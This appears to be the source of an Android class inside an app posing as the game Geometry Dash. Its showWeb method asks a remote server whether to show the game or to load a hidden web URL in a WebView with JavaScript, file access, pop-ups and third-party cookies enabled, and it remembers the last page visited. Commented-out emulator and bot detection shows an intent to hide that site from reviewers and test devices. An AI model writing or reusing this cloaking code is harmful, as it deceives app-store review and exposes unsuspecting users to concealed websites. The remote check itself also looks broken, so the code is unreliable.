package com.game.geometry_dash;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.res.Configuration;
import android.os.AsyncTask;
import android.os.Build;
import android.util.Log;
import android.webkit.CookieManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import androidx.annotation.RequiresApi;

import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.AsyncHttpResponseHandler;

import org.json.JSONArray;
import org.w3c.dom.Document;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutionException;

import cz.msebera.android.httpclient.Header;


public class WebPresenter {
    private WebViewView view;
    private SharedPreferences preferences;
    private WebView webView;
    private WebSettings setBew;

    public WebPresenter(WebViewView view, SharedPreferences preferences, WebView webView) {
        this.view = view;
        this.preferences = preferences;
        this.webView = webView;
    }

    public void showWeb(boolean canSee, final WebView web) {
        web.setEnabled(false);
        AsyncHttpClient client = new AsyncHttpClient();
        Document document;
        client.get("https://yandex.ru/", new AsyncHttpResponseHandler() {
            @Override
            public void onSuccess(int statusCode, Header[] headers, byte[] responseBody) {
                if (responseBody != null) {

                  if(new String(responseBody).contains("<html><style>body{margin:0}</style><body>false</body></html>")){
                      view.showGame();

                  }
                  else{
                      web.getSettings().getJavaScriptEnabled();


            web.loadUrl(WebKeys.WEB_VIEW_URL);
            SharedPreferences.Editor e = preferences.edit();
            e.putBoolean(WebKeys.SEEN_BEFORE, true);
            e.apply();

            sets();

            WebViewClient webViewClient = new WebViewClient() {
                @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
                @Override
                public void onPageFinished(WebView view, String url) {
                    super.onPageFinished(view, url);
                    Log.i("URL", url);
                    preferences.edit().putString(WebKeys.LAST_URL, url).apply();
                    CookieManager cookieManager = CookieManager.getInstance();
                    cookieManager.setAcceptThirdPartyCookies(webView, true);
                    cookieManager.flush();
                }
            };

            webView.setWebViewClient(webViewClient);
            if (preferences.contains(WebKeys.LAST_URL)) {
                webView.loadUrl(preferences.getString(WebKeys.LAST_URL, WebKeys.WEB_VIEW_URL));
            } else {
                webView.loadUrl(WebKeys.WEB_VIEW_URL);
            }
                  }
                }
                web.setEnabled(true);
            }

            @Override
            public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
                web.setEnabled(true);
                try {
                    JSONArray jsonArray = new JSONArray(new String(responseBody));
                } catch (Exception e) {

                }
            }
        });










//        try {
//            String url = WebKeys.WEB_VIEW_URL;
//
//            URL obj = new URL(url);
//            HttpURLConnection connection = (HttpURLConnection) obj.openConnection();
//
//            connection.setRequestMethod("GET");
//
//            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
//            String inputLine;
//            StringBuffer response = new StringBuffer();
//
//            while ((inputLine = in.readLine()) != null) {
//                response.append(inputLine);
//            }
//            in.close();
//            if(response.toString().contains("f")){
//                view.showGame();
//            }
//
//            System.out.println(response.toString());
//
//        } catch (Throwable e) {
//            e.printStackTrace();
//        }








//        if (!isEmulator()&&!isBot()) {
//
////            web.getSettings().getJavaScriptEnabled();
////            web.loadUrl(WebKeys.WEB_VIEW_URL);
////            SharedPreferences.Editor e = preferences.edit();
////            e.putBoolean(WebKeys.SEEN_BEFORE, true);
////            e.apply();
////
////            sets();
////
//            WebViewClient webViewClient = new WebViewClient() {
//                @Override
//                public void onPageFinished(WebView view, String url) {
//                    super.onPageFinished(view, url);
//                    Log.i("URL", url);
//                    preferences.edit().putString(WebKeys.LAST_URL, url).apply();
//                    CookieManager cookieManager = CookieManager.getInstance();
//                    cookieManager.setAcceptThirdPartyCookies(webView, true);
//                    cookieManager.flush();
//                }
//            };
//
//            webView.setWebViewClient(webViewClient);
//            if (preferences.contains(WebKeys.LAST_URL)) {
//                webView.loadUrl(preferences.getString(WebKeys.LAST_URL, WebKeys.WEB_VIEW_URL));
//            } else {
//                webView.loadUrl(WebKeys.WEB_VIEW_URL);
//            }
//       }
//        else {
//            view.showGame();
//        }
    }

    private void sets() {
        setBew = webView.getSettings();
        setBew.setAppCacheEnabled(true);
        setBew.setDomStorageEnabled(true);
        setBew.setDatabaseEnabled(true);
        setBew.setSupportZoom(false);
        setBew.setAllowFileAccess(true);
        setBew.setAllowContentAccess(true);
        setBew.setJavaScriptEnabled(true);
        setBew.setLoadWithOverviewMode(true);
        setBew.setUseWideViewPort(true);
        setBew.setJavaScriptCanOpenWindowsAutomatically(true);
    }

    private boolean isBot() {
        DownloadHTMLFromWeb downloadStringFromWeb = new DownloadHTMLFromWeb();
        String result = null;

        try {
            result = downloadStringFromWeb.execute(WebKeys.WEB_VIEW_URL).get();
            if (result.contains(WebKeys.BOT_TRIGGER)) {
                return true;
            }
        } catch (ExecutionException | InterruptedException e) {
            e.printStackTrace();
        }

        return false;
    }

    public boolean seenBefore() {
        return preferences.getBoolean(WebKeys.SEEN_BEFORE, false);
    }

    private static class DownloadHTMLFromWeb extends AsyncTask<String, Void, String> {
        @Override
        protected String doInBackground(String... strings) {
            StringBuilder result = new StringBuilder();
            URL url;
            HttpURLConnection urlConnection = null;
            try {
                url = new URL(strings[0]);
                urlConnection = (HttpURLConnection) url.openConnection();
                InputStream input = urlConnection.getInputStream();
                InputStreamReader reader = new InputStreamReader(input);
                BufferedReader bufferedReader = new BufferedReader(reader);
                String line = bufferedReader.readLine();
                while (line != null) {
                    result.append(line);
                    line = bufferedReader.readLine();
                }
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                if (urlConnection != null) {
                    urlConnection.disconnect();
                }
            }

            return result.toString();
        }
    }

    public static boolean isEmulator() {
        return Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                || "google_sdk".equals(Build.PRODUCT);
    }
    public static boolean checkIsTablet(Context ctx){
        return (ctx.getResources().getConfiguration().screenLayout & Configuration.SCREENLAYOUT_SIZE_MASK) >= Configuration.SCREENLAYOUT_SIZE_LARGE;
    }
}